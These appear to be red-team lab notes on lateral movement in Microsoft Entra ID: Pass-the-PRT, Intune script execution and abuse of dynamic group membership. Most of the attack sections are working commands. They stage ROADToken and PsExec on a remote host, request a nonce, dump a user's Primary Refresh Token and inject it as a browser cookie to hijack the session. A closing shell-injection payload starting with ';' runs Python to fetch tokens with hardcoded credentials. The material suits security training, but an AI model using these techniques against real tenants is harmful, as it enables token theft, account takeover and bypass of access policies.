# Lateral Movement - Pass-the-PRT

**Primary Refresh Token (PRT)**

* Recall that refresh tokens can be used to request new access tokens for a particular application.
* PRT is a special refresh token used for single sign-on (SSO)!
  * It can be used to obtain access and refresh tokens to any application.
  * Issued to a user for a specific device
  * Valid for 90 days and is continuously renewed
  * CloudAP SSP requests and caches PRT on a device
  * If PRT is MFA-based (Windows Hello or Windows Account manager), then the claim is transferred to app tokens to prevent MFA challenge for every application.
  * Before a fix in August 2021, PRT always had MFA claims.
* If we compromise an Entra joined (or Hybrid joined) machine, it is possible to extract PRT and other keys for a user.
* For Entra Registered machine, PRT is issued if a user has added a secondary work account to the device.

```powershell
Copy-Item -ToSession $jumpvm -Path C:\\AzAD\\Tools\\ROADToken.exe -Destination C:\\Users\\student2802\\Documents -Verbose
Copy-Item -ToSession $jumpvm -Path C:\\AzAD\\Tools\\PsExec64.exe -Destination C:\\Users\\student2802\\Documents -Verbose
Copy-Item -ToSession $jumpvm -Path C:\\AzAD\\Tools\\SessionExecCommand.exe -Destination C:\\Users\\student2802\\Documents -Verbose

Enter-PSSession -Session $jumpvm
Invoke-Command -Session $infradminsrv -ScriptBlock{mkdir C:\\Users\\Public\\student2802}
Copy-Item -ToSession $infradminsrv -Path C:\\Users\\student2802\\Documents\\ROADToken.exe -Destination C:\\Users\\Public\\student2802 –Verbose
Copy-Item -ToSession $infradminsrv -Path C:\\Users\\student2802\\Documents\\PsExec64.exe -Destination C:\\Users\\Public\\student2802 –Verbose
Copy-Item -ToSession $infradminsrv -Path C:\\Users\\student2802\\Documents\\SessionExecCommand.exe -Destination C:\\Users\\Public\\student2802 –Verbose

Invoke-Command -Session $infradminsrv -ScriptBlock{ls C:\\Users\\Public\\student2802\\}
Invoke-Command -Session $infradminsrv -ScriptBlock{qwinsta}
Invoke-Command -Session $infradminsrv -ScriptBlock{Get-Process -IncludeUserName}
```

**Lateral Movement - Pass-the-PRT**

* If we have access to a PRT, it is possible to request access tokens for any application.
* Chrome uses BrowserCore.exe to use PRT and request PRT cookie for SSO experience.
* This PRT cookie - `x-ms-RefreshTokenCredential` – can be used in a browser to access any application as the user whose PRT we have
* Entra ID makes use of nonce for request validation. We need to request a nonce to extract PRT:

```powershell
$TenantId = "2d50cb29-5f7b-48a4-87ce-fe75a941adb6"
$URL = "<https://login.microsoftonline.com/$TenantId/oauth2/token>"

$Params = @{
    "URI"     = $URL 
    "Method"  = "POST"
}

$Body = @{
    "grant_type" = "srv_challenge"
    }
    
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
```

> We can extract PRT by using the below tools in a session of the target Entra ID user:

* ROADToken `C:\\AzAD\\Tools\\ROADToken.exe <nonce>`
* AADInternals `Get-AADIntUserPRTToken`
* We could also use Mimikatz or its variants (like pypykatz) to extract the PRT and other secrets (Session Key and Clear key).
* Please note that in the lab, we are using `SessionExecCommand` to run `ROADToken` in context of the user Michael Barron.

```powershell
Invoke-Command -Session $infradminsrv -ScriptBlock{C:\\Users\\Public\\student43\\PsExec64.exe -accepteula -s "cmd.exe" " /c C:\\Users\\Public\\student43\\SessionExecCommand.exe MichaelMBarron C:\\Users\\Public\\student43\\ROADToken.exe AwABEgEAAAADAOz_BQD0__zu8sIZg5aMp6p2_98j1FzCV1hwP6tXMPtgalHS45DClKW4t7il5ooWU0VLfmVGA90QiHsjoztbI7ISeI3tJy4gAA > C:\\Users\\Public\\student2802\\PRT.txt"}
Invoke-Command -Session $infradminsrv -ScriptBlock{cat c:\\Users\\Public\\student2802\\PRT.txt}
```

* Once we have the PRT cookie, copy the value from previous command and use it with Chrome web browser
  * Open the Browser in Incognito mode
  * Go to [https://login.microsoftonline.com/login.srf](https://login.microsoftonline.com/login.srf)
  * Press F12 (Chrome dev tools) -> Application -> Cookies
  * Clear all cookies and then add one named `x-ms-RefreshTokenCredential` for[https://login.microsoftonline.com](https://login.microsoftonline.com/) and set its value to that retrieved from AADInternals
  * Mark HTTPOnly and Secure for the cookie
  * Visit [https://login.microsoftonline.com/login.srf](https://login.microsoftonline.com/login.srf) again and we will get access as the user!
  * Note that a location based Conditional Access Policy would block Pass-the-PRT whereas a “require compliant and/or Entra joined device” policy is bypassed.

#### Device Management - Intune

* Intune is a Mobile Device Management (MDM) and Mobile Application Management (MAM) service.
* Intune needs an Enterprise Mobility + Security E5 license.
* For devices to be fully managed using Intune, they need to be enrolled.
* Enrolled devices (IsCompliant or Compliant set to Yes in Azure Portal) allow
  * Access control using Conditional Access Policies
  * Control installed applications, access to information, setup threat protection agents etc.

**Lateral Movement - Intune - Cloud to On-Prem**

* Using the Endpoint Manager at [https://endpoint.microsoft.com/](https://endpoint.microsoft.com/), a user with Global Administrator or Intune Administrator role can execute PowerShell scripts on an enrolled Windows device.
* The script runs with privileges of SYSTEM on the device. We do not get to see the script output and the script doesn't run again if there is no change.
* As per documentation, the script execution takes place every one hour but in my experience that is random.

#### Dynamic Groups

* We can create rules - based on user or device properties - to automatically join them to a Dynamic group.
* For example, an organization may add users to a particular group based on their userPrincipalName, department, mail etc.
* When a group membership rule is applied, all users and device attributes are evaluated for matches.
* When an attribute changes for a user or device, all dynamic group rules are checked for a match and possible membership changes.
* No Entra ID roles can be assigned to a Dynamic Group but Azure RBAC roles can be assigned.
* Dynamic groups requires Entra ID premium P1 license.

**Abuse**

* By default, any user can invite guests in Entra ID.
* If a dynamic group rule allows adding users based on the attributes that a guest user can modify, it will result in abuse of this feature.
* There are two ways the rules can be abused
  * Before joining a tenant as guest. If we can enumerate that a property, say mail, is used in a rule, we can invite a guest with the email ID that matches the rule.
  * After joining a tenant as guest. A guest user can 'manage their own profile', that is, they can modify manager and alternate email. We can abuse a rule that matches on Manager (Direct Reports for "{objectID\_of\_manager}") or alternative email (user.otherMails -any (\_ -contains "string"))

```
; python -c "import http.client, json; client_id, tenant_id, username, password = '04b07795-8ddb-461a-bbee-02f9e1bf7b46', 'b6e0615d-2c17-46b3-922c-491c91624acd', 'thomasebarlow@defcorpit.onmicrosoft.com', r'DeployM3ntUserInTh3Tan3nt!!'; scope = 'openid profile offline_access <https://graph.microsoft.com/.default>'; body = f'client_id={client_id}%26grant_type=password%26username={username}%26password={password}%26scope={scope}%26client_info=1'; headers = {'Content-Type': 'application/x-www-form-urlencoded'}; conn = http.client.HTTPSConnection('login.microsoftonline.com'); conn.request('POST', f'/{tenant_id}/oauth2/v2.0/token', body, headers); response = conn.getresponse(); status_code = response.status; data = json.loads(response.read()); conn.close(); print(status_code)";
; python /tmp/uploads/enumerate_dynamic_groups_x/enumerate_dynamic_groups_ x.py ;
```

\
